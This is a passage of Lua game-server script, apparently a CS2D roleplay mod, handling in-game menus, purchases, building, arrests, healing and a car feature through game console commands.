			else
				rp_msg2(id,[[255000000]],[[Not position stored!]])
			end
		elseif sel == 2 then
			rp_msg2(id,[[000255000]],[[Position stored succesfully!]])
			rp_msg2(id,[[000255000]],[[X: ]]..player(id,[[x]])..[[ Y: ]]..player(id,[[y]]))
			tele_x[id] = player(id,[[x]])
			tele_y[id] = player(id,[[y]])
			player_have_pos[id]=true
		elseif sel == 3 then
			if player_have_pos[id]==true then
				if tsb[id]==0 then
					rp_msg2(id,[[000255000]],[[You will now spawn at Teleport position!@C]])
					tsb[id]=1
				elseif tsb[id]==1 then
					rp_msg2(id,[[000255000]],[[You will now spawn normally!@C]])
					tsb[id]=0
				end
			else
				rp_msg2(id,[[255000000]],[[Not position stored!@C]])
			end
		elseif sel == 4 then
			rp_msg2(id,[[000255000]],[[Use five-seven to arrest players!]])
			arrest_x[id]=player(id,[[x]])
			arrest_y[id]=player(id,[[y]])
		end
	end
	if men == [[CT Menu Settings]] then
		if sel == 1 then
			if drop_system_m == 1 then
				drop_system_m = 0
				rp_msg([[255000000]],[[Drop system disabled. Called by ]]..player(id,[[name]])..[[@C]])
			elseif drop_system_m == 0 then
				drop_system_m = 1
				rp_msg([[000255000]],[[Drop system enabled. Called by ]]..player(id,[[name]])..[[@C]])
			end
			set_men(id)
		elseif sel == 2 then
			if tele_sys == 1 then
				tele_sys = 0
				rp_msg([[255000000]],[[Teleport system disabled. Called by ]]..player(id,[[name]])..[[@C]])
			elseif tele_sys == 0 then
				tele_sys = 1
				rp_msg([[000255000]],[[Drop system enabled. Called by ]]..player(id,[[name]])..[[@C]])
			end
		end
	end
	if men == [[CT Insta Equip Menu]] then
		if sel == 1 then
			if rp_money[id]>=10000 then
				parse([[equip ]]..id..[[ 10]])
				rp_money[id]=rp_money[id]-10000
			else
				nmn(id)
			end
		elseif sel == 2 then
			if rp_money[id]>=20000 then
				parse([[equip ]]..id..[[ 41]])
				rp_money[id]=rp_money[id]-20000
			else
				nmn(id)
			end
		elseif sel == 3 then
			if rp_money[id]>=50000 then
				parse([[equip ]]..id..[[ 81]])
				rp_money[id]=rp_money[id]-50000
			else
				nmn(id)
			end
		elseif sel == 4 then
			if rp_money[id]>=10000 then
				parse([[equip ]]..id..[[ 3]])
				rp_money[id]=rp_money[id]-10000
			else
				nmn(id)
			end
		elseif sel == 5 then
			if rp_money[id]>=25000 then
				parse([[equip ]]..id..[[ 6]])
				rp_money[id]=rp_money[id]-25000
			else
				nmn(id)
			end
		elseif sel == 6 then
			if rp_money[id]>=30000 then
				parse([[equip ]]..id..[[ 69]])
				rp_money[id]=rp_money[id]-30000
			else
				nmn(id)
			end
		elseif sel == 7 then
			if rp_money[id]>=50000 then
				parse([[equip ]]..id..[[ 82]])
				rp_money[id]=rp_money[id]-50000
			else
				nmn(id)
			end
		end
	end
	if men == [[Drop System]] then
		if sel == 1 then
			if rp_money[id]>= 100 then
				parse([[spawnitem 66 ]]..x..[[ ]]..y)
				rp_money[id]=rp_money[id]-100
			else
				nmn(id)
			end
		elseif sel == 2 then
			if rp_money[id]>= 500 then
				parse([[spawnitem 67 ]]..x..[[ ]]..y)
				rp_money[id]=rp_money[id]-500
			else
				nmn(id)
			end
		elseif sel == 3 then
			if rp_money[id]>= 1000 then
				parse([[spawnitem 68 ]]..x..[[ ]]..y)
				rp_money[id]=rp_money[id]-1000
			else
				nmn(id)
			end
		elseif sel == 4 then
			if rp_money[id]>= 5000 then
				for i = 1,5 do
					parse([[spawnitem 68 ]]..x..[[ ]]..y)
					rp_money[id]=rp_money[id]-1000
				end
			else
				nmn(id)
			end
		elseif sel == 5 then
			if rp_money[id]>= 10000 then
				for i = 1,10 do
					parse([[spawnitem 68 ]]..x..[[ ]]..y)
					rp_money[id]=rp_money[id]-1000
				end
			else
				mnm(id)
			end
		elseif sel == 6 then
			if rp_money[id]>= 50000 then
				for i = 1,50 do
					parse([[spawnitem 68 ]]..x..[[ ]]..y)
					rp_money[id]=rp_money[id]-1000
				end
			else
				nmn(id)
			end
		elseif sel == 7 then
			if rp_money[id]>= 100000 then
				for i = 1,100 do
					parse([[spawnitem 68 ]]..x..[[ ]]..y)
					rp_money[id]=rp_money[id]-1000
				end
			else
				nmn(id)
			end
		elseif sel == 8 then
			if rp_license[id]==true then
				rp_msg2(id,[[000255000]],[[Now you can drop an item!@C]])
				rp_drop_item[id]=true
			else
				rp_msg2(id,[[255000000]],[[You must to be licensed to use this function!]])
			end
		end
	end
	updatehud(id)
end

function mlicense(id)
	bf4_msg2(id,[[255000000]],[[You must to be licensed to build this!@C]])
end

addhook([[buildattempt]],[[rp_build]])
function rp_build(id,type,x,y)
	if rp_ct[id]==true then
		if rp_build_m[id]==1 then
			if type == 8 then
				if not entity(x,y,[[exists]]) then
					parse([[spawnobject 12 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					return 1
				end
			elseif type == 21 then
				return 0
			else
				if not entity(x,y,[[exists]]) then
					parse([[spawnobject ]]..type..[[ ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					return 1
				end
			end
		elseif rp_build_m[id]==2 then
			if type == 8 then
				if not entity(x,y,[[exists]]) then
					parse([[spawnobject 12 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 0 ]]..id)
					return 1
				end
			elseif type == 21 then
				return 0
			else
				if not entity(x,y,[[exists]]) then
					parse([[spawnobject ]]..type..[[ ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 0 ]]..id)
					return 1
				end
			end
		end
	else
		if type == 6 then
			if rp_license[id]==true then
				if rp_money[id]>= 1500 then
					parse([[spawnobject 6 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-1500
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 7 then
			if rp_license[id]==true then
				if rp_money[id]>= 5000 then
					parse([[spawnobject 7 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-5000
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 8 then
			if rp_license[id]==true then
				if rp_money[id]>=5000 then
					parse([[spawnobject 8 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-5000
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 9 then
			if rp_license[id]==true then
				if rp_money[id]>=5000 then
					parse([[spawnobject 9 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-5000
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 13 then
			if rp_license[id]==true then
				if rp_money[id]>=3000 then
					parse([[spawnobject 13 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-3000
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 14 then
			if rp_license[id]==true then
				if rp_money[id]>=3000 then
					parse([[spawnobject 14 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
					rp_money[id]=rp_money[id]-3000
				else
					nmn(id)
				end
			else
				mlicense(id)
			end
		elseif type == 1 then
			if rp_money[id]>=300 then
				parse([[spawnobject 1 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
				rp_money[id]=rp_money[id]-300
			else
				nmn(id)
			end
		elseif type == 2 then
			if rp_money[id]>=500 then
				parse([[spawnobject 2 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
				rp_money[id]=rp_money[id]-500
			else
				nmn(id)
			end
		elseif type == 3 then
			if rp_money[id]>=1000 then
				parse([[spawnobject 3 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
				rp_money[id]=rp_money[id]-1000
			else
				nmn(id)
			end
		elseif type == 4 then
			if rp_money[id]>=2000 then
				parse([[spawnobject 4 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
				rp_money[id]=rp_money[id]-2000
			else
				nmn(id)
			end
		elseif type == 5 then
			if rp_money[id]>=3000 then
				parse([[spawnobject 5 ]]..x..[[ ]]..y..[[ ]]..player(id,[[rot]])..[[ 0 ]]..player(id,[[team]])..[[ ]]..id)
				rp_money[id]=rp_money[id]-3000
			else
				nmn(id)
			end
		end
	end
	updatehud(id)
end

addhook([[spawn]],[[rp_spawn]])
function rp_spawn(id)
	if rp_arrest[id]==false then
--		if tsb[id]==1 then
--			parse([[setpos ]]..id..[[ ]]..tele_x[id]..[[ ]]..tele_y[id])
--		end
	else
		return "50,74"
	end
	parse([[equip ]]..id..[[ 74]])
	parse([[equip ]]..id..[[ 75]])
end

addhook([[hit]],[[rp_hit]])
function rp_hit(id,source,wpn,hpdmg)
	if wpn == 45 then
		rp_msg2(source,[[255000000]],[[This is a minning Laser!]])
		return 1
	elseif wpn == 5 then
		rp_money[source]=rp_money[source]+100
		rp_money[id]=rp_money[id]-100
		updatehud(source)
		updatehud(id)
		return 1
	elseif wpn == 6 then
		if rp_ct[source]==true then
			if arrest_x[source]>0 and arrest_y[source]>0 then
				parse([[setpos ]]..id..[[ ]]..arrest_x[source]..[[ ]]..arrest_y[source])
			else
				rp_msg2(source,[[255000000]],[[Not position stored!]])
			end
		else
			rp_msg2(source,[[255000000]],[[You cant arrest, you aren't CT]])
		end
		return 1
	elseif wpn == 3 then
		parse([[sethealth ]]..id..[[ ]]..player(id,[[health]])+math.random(10,20))
		rp_msg2(id,[[255255000]],[[You have been healed by ]]..player(source,[[name]]))
		return 1
	elseif wpn == 46 then
		parse([[sethealth ]]..id..[[ ]]..player(id,[[health]])+1)
		return 1
	elseif wpn == 86 then
		parse([[sethealth ]]..id..[[ ]]..player(id,[[health]])+math.random(10,20))
		return 1
	elseif wpn == 31 then
		if rp_ct[source]==true then
			parse([[explosion ]]..player(id,[[x]])..[[ ]]..player(id,[[y]])..[[ 10 1000000 ]]..source)
			return 1
		end
	elseif wpn == 21 then
		rp_money[id]=rp_money[id]-50
		rp_money[source]=rp_money[source]+50
		return 1
	elseif wpn == 75 then
		if rp_money[source]>=100 then
			rp_money[source]=rp_money[source]-100
			rp_money[id]=rp_money[id]+100
			return 1
		else
			nmn(source)
			return 1
		end
	end
	if isAdmin(id) then
		return 1
	end
updatehud(id)
	if source ~= nil then
		if player(source,[[exists]]) then
			updatehud(source)
		end
	end
end

addhook([[projectile]],[[rp_projectile]])
function rp_projectile(id,wpn,x,y)
	if wpn == 54 then
		parse([[flasposition ]]..x..[[ ]]..y..[[ 500]])
	elseif wpn == 53 then
		parse([[setpos ]]..id..[[ ]]..x..[[ ]]..y)
	end
	if rp_ct[id]==true then
		parse([[equip ]]..id..[[ ]]..wpn)
		parse([[setweapon ]]..id..[[ ]]..wpn)
	end
end

addhook([[use]],[[carmod_use]])
function carmod_use(id,event,data,x,y)
	if event == 0 then
		if pic[id] == 0 then
			if player(id,[[tilex]])==car_tx[id] and player(id,[[tiley]])==car_ty[id] then
				freeimage(car_img_pos[id])
				pl_speed[id]=player(id,[[speedmod]])
				car_img[id]=image([[gfx/gfx/CF_cars/rage.bmp]],1,1,200+id) -- 423 Coloque onde esta o img do carro
				parse([[speedmod ]]..id..[[ -100]])
				pic[id]=1
			end
		elseif pic[id]==1 then
			freeimage(car_img[id])
			parse([[speedmod ]]..id..[[ ]]..pl_speed[id])
			car_tx[currentcar[id]]=player(id,[[tilex]])
			car_ty[currentcar[id]]=player(id,[[tiley]])
			car_img_pos[id]=image([[gfx/gfx/CF_cars/rage.bmp]],1,1,1) -- 423 Coloque onde esta o img do carro
			imagepos(car_img_pos[id],player(id,[[x]]),player(id,[[y]]),player(id,[[rot]]))
			pic[id]=0
		end
	end
end